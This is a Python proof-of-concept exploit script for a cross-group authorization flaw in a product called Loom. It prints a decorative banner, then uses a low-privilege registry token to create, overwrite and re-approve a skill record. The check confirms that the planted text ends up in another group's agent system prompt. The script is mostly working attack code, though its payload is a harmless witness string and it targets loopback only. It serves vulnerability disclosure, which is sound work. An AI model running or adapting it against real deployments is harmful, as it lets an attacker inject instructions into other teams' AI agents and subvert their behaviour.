#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: loom-skill-plant (Medium: 6.2)
#  Vendor: Loom (AWS)
#  Versions: Loom v1.9.0 and v1.10.3
#  Impact: registry write replaces a skill that a later deploy folds into another group's prompt
#  Requires: Docker, loopback only, public tag checkout
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "loom-skill-plant"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _PRINT(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _PRINT(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_PRINT = _builtins.print
_builtins.print = _cprint

"""Loom v1.9.0 skill plant. CWE-863.

g-admins-demo holds registry:write and is confined to loom:group=demo.
A skill has no Loom row, so PUT and approve of SKILL.md skip the group
check. The victim agent is tagged mcp and already has the skill attached.
The product fold helper copies the live skillMd into the system prompt.

MCP and agent records that are linked to a Loom row in group mcp still
403 on approve.
"""

import json
import os
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Any

LABEL = "LOOM-190-SKILL-PLANT"
WITNESS = "LOOM-190-SKILL-PLANT-WITNESS"
LOOM_URL = os.environ.get("LOOM_URL", "http://127.0.0.1:18640").rstrip("/")
DEMO = "lab-demo"
ORIGINAL = "Catalog helper notes."
SKILL_NAME = "catalog-skill"
SKILL_VERSION = "1.0.0"
AGENT_RECORD = "lab-agent-mcp"
MCP_RECORD = "lab-mcp-group"


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str

    def json(self) -> Any:
        try:
            return json.loads(self.body)
        except json.JSONDecodeError:
            return None


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    raise SystemExit(1)


def success(detail: str) -> None:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    raise SystemExit(0)


def http(method: str, path: str, payload: dict | None = None, token: str | None = None) -> HttpResult:
    url = path if path.startswith("http") else f"{LOOM_URL}{path}"
    headers = {"Accept": "application/json"}
    data = None
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return HttpResult(int(resp.status), resp.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as exc:
        return HttpResult(int(exc.code), exc.read().decode("utf-8", "replace"))
    except urllib.error.URLError as exc:
        return HttpResult(0, str(exc.reason))


def groups_of(payload: Any) -> list[str]:
    if not isinstance(payload, dict):
        return []
    groups = payload.get("groups") or []
    if not isinstance(groups, list):
        return []
    return [str(item) for item in groups]


def skill_md(payload: Any) -> str:
    if not isinstance(payload, dict):
        return ""
    data = (
        payload.get("descriptors", {})
        .get("agentSkillsDefinition", {})
        .get("additionalData", {})
        .get("skillMd", {})
        .get("data", "")
    )
    return data if isinstance(data, str) else ""


def skill_body(name_md: str) -> dict[str, str]:
    return {
        "skill_name": SKILL_NAME,
        "skill_description": "Catalog helper",
        "skill_license": "MIT",
        "skill_version": SKILL_VERSION,
        "skill_md": name_md,
    }


def seed() -> tuple[int, int]:
    from app.db import SessionLocal
    from app.models.agent import Agent
    from app.models.mcp import McpServer

    db = SessionLocal()
    try:
        agent = Agent(
            arn="arn:aws:bedrock-agentcore:us-east-1:123456789012:runtime/victim-agent",
            runtime_id="victim-runtime",
            name="victim-agent",
            description="Victim agent.",
            status="READY",
            region="us-east-1",
            account_id="123456789012",
            source="register",
            protocol="HTTP",
            network_mode="PUBLIC",
            registry_record_id=AGENT_RECORD,
            registry_status="DRAFT",
        )
        agent.set_tags({"loom:group": "mcp"})
        server = McpServer(
            name="victim-mcp",
            description="Victim MCP",
            endpoint_url="http://127.0.0.1:9/mcp",
            transport_type="streamable_http",
            status="active",
            auth_type="none",
            delegation_mode="m2m",
            registry_record_id=MCP_RECORD,
            registry_status="DRAFT",
        )
        server.set_tags({"loom:group": "mcp"})
        db.add(agent)
        db.add(server)
        db.commit()
        db.refresh(agent)
        db.refresh(server)
        log(f"ioc seed agent={agent.id} mcp={server.id} group=mcp")
        return int(agent.id), int(server.id)
    finally:
        db.close()


def attach_skill(agent_id: int, record_id: str) -> None:
    from app.db import SessionLocal
    from app.models.integration import Integration

    db = SessionLocal()
    try:
        db.add(
            Integration(
                agent_id=agent_id,
                integration_type="skill",
                integration_config=json.dumps({"record_id": record_id}),
                enabled=True,
            )
        )
        db.commit()
    finally:
        db.close()


def row_status(kind: str, row_id: int) -> str | None:
    from app.db import SessionLocal
    from app.models.agent import Agent
    from app.models.mcp import McpServer

    model = Agent if kind == "agent" else McpServer
    db = SessionLocal()
    try:
        row = db.query(model).filter(model.id == row_id).first()
        if row is None:
            return None
        return row.registry_status
    finally:
        db.close()


def fold_prompt(agent_id: int) -> str:
    from app.db import SessionLocal
    from app.routers.agents import AgentCreateRequest, _build_system_prompt, _get_attached_skill_prompt_text

    db = SessionLocal()
    try:
        text = _get_attached_skill_prompt_text(agent_id, db)
        return _build_system_prompt(AgentCreateRequest(agent_description="Victim agent."), text)
    finally:
        db.close()


def main() -> None:
    health = http("GET", "/health")
    log(f"ioc health-http={health.status}")
    if health.status != 200:
        fail(f"health-http={health.status} body={health.body[:200]}")

    unauth = http("GET", "/api/auth/me")
    log(f"ioc unauth-me-http={unauth.status}")
    if unauth.status != 401:
        fail(f"unauth-me-http={unauth.status} body={unauth.body[:200]}")

    me = http("GET", "/api/auth/me", token=DEMO)
    groups = groups_of(me.json())
    log(f"ioc me-demo-http={me.status} groups={','.join(groups)}")
    if me.status != 200 or "g-admins-demo" not in groups or "g-admins-super" in groups:
        fail(f"me-demo-http={me.status} groups={','.join(groups)} body={me.body[:300]}")

    agent_id, mcp_id = seed()

    agent_get = http("GET", f"/api/agents/{agent_id}", token=DEMO)
    log(f"ioc agent-demo-get={agent_get.status} body={agent_get.body[:240]}")
    if agent_get.status != 403:
        fail(f"agent-demo-get={agent_get.status} expected-403 body={agent_get.body[:240]}")

    created = http(
        "POST",
        "/api/registry/records",
        {"resource_type": "skill", **skill_body(ORIGINAL)},
        token=DEMO,
    )
    created_rec = created.json()
    record_id = ""
    created_status = None
    if isinstance(created_rec, dict):
        record_id = str(created_rec.get("record_id") or "")
        created_status = created_rec.get("status")
    log(f"ioc skill-create={created.status} record={record_id} status={created_status}")
    if created.status != 201 or not record_id:
        fail(f"skill-create={created.status} body={created.body[:400]}")
    if WITNESS in created.body:
        fail("skill-create-contained-witness")

    approved = http(
        "POST",
        f"/api/registry/records/{record_id}/approve",
        {"reason": "catalog"},
        token=DEMO,
    )
    log(f"ioc skill-approve-initial={approved.status} body={approved.body[:240]}")
    if approved.status != 200:
        fail(f"skill-approve-initial={approved.status} body={approved.body[:300]}")

    attach_skill(agent_id, record_id)
    baseline = fold_prompt(agent_id)
    log(f"ioc fold-baseline={baseline[:300]!r}")
    if WITNESS in baseline or ORIGINAL not in baseline or "## Attached Skills" not in baseline:
        fail(f"fold-baseline-unexpected prompt={baseline[:300]}")

    mcp_approve = http(
        "POST",
        f"/api/registry/records/{MCP_RECORD}/approve",
        {"reason": "cross-group"},
        token=DEMO,
    )
    agent_approve = http(
        "POST",
        f"/api/registry/records/{AGENT_RECORD}/approve",
        {"reason": "cross-group"},
        token=DEMO,
    )
    mcp_status = row_status("mcp", mcp_id)
    agent_status = row_status("agent", agent_id)
    log(f"ioc mcp-approve={mcp_approve.status} body={mcp_approve.body[:220]}")
    log(f"ioc agent-approve={agent_approve.status} body={agent_approve.body[:220]}")
    log(f"ioc after-contrast mcp-status={mcp_status} agent-status={agent_status}")
    if mcp_approve.status != 403 or agent_approve.status != 403:
        fail(
            f"contrast-not-403 mcp={mcp_approve.status} agent={agent_approve.status} "
            f"mcp-body={mcp_approve.body[:180]} agent-body={agent_approve.body[:180]}"
        )
    if mcp_status != "DRAFT" or agent_status != "DRAFT":
        fail(f"contrast-stamped mcp={mcp_status} agent={agent_status}")

    planted = http("PUT", f"/api/registry/records/{record_id}", skill_body(WITNESS), token=DEMO)
    log(f"ioc skill-put={planted.status} body={planted.body[:500]}")
    if planted.status == 403:
        fail(f"leftover-closed skill-put={planted.status}")
    if planted.status != 200:
        fail(f"skill-put={planted.status} body={planted.body[:400]}")
    planted_rec = planted.json()
    planted_md = skill_md(planted_rec)
    planted_status = planted_rec.get("status") if isinstance(planted_rec, dict) else None
    if planted_md != WITNESS:
        fail(f"skill-put-md={planted_md!r} expected-witness")
    if planted_status == "APPROVED":
        fail("skill-put-stayed-approved expected-DRAFT-so-approve-is-on-path")

    held = fold_prompt(agent_id)
    log(f"ioc fold-before-reapprove={held[:300]!r}")
    if WITNESS in held:
        fail("fold-read-unapproved-skill")

    reapproved = http(
        "POST",
        f"/api/registry/records/{record_id}/approve",
        {"reason": "republish"},
        token=DEMO,
    )
    log(f"ioc skill-reapprove={reapproved.status} body={reapproved.body[:240]}")
    if reapproved.status != 200:
        fail(f"skill-reapprove={reapproved.status} body={reapproved.body[:300]}")

    detail = http("GET", f"/api/registry/records/{record_id}", token=DEMO)
    detail_rec = detail.json()
    detail_md = skill_md(detail_rec)
    detail_status = detail_rec.get("status") if isinstance(detail_rec, dict) else None
    log(f"ioc skill-get={detail.status} status={detail_status} md-witness={'yes' if WITNESS in detail_md else 'no'}")
    if detail.status != 200 or detail_status != "APPROVED" or detail_md != WITNESS:
        fail(f"skill-get={detail.status} status={detail_status} md={detail_md!r}")

    prompt = fold_prompt(agent_id)
    log(f"ioc fold-prompt={prompt[:400]!r}")
    fold_ok = WITNESS in prompt and ORIGINAL not in prompt and "## Attached Skills" in prompt and "Victim agent." in prompt
    if not fold_ok:
        fail(f"fold-missing-witness prompt={prompt[:400]}")

    if row_status("agent", agent_id) != "DRAFT" or row_status("mcp", mcp_id) != "DRAFT":
        fail("skill-approve-stamped-linked-row")

    success(
        "unauth-me=401"
        f" me-groups={','.join(groups)}"
        f" agent-get={agent_get.status}"
        f" skill-put={planted.status}"
        f" skill-reapprove={reapproved.status}"
        f" mcp-approve={mcp_approve.status}"
        f" agent-approve={agent_approve.status}"
        " fold-witness=yes"
    )


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        log(f"FAIL {LABEL} unhandled {type(exc).__name__}: {exc} {WITNESS}")
        sys.exit(1)

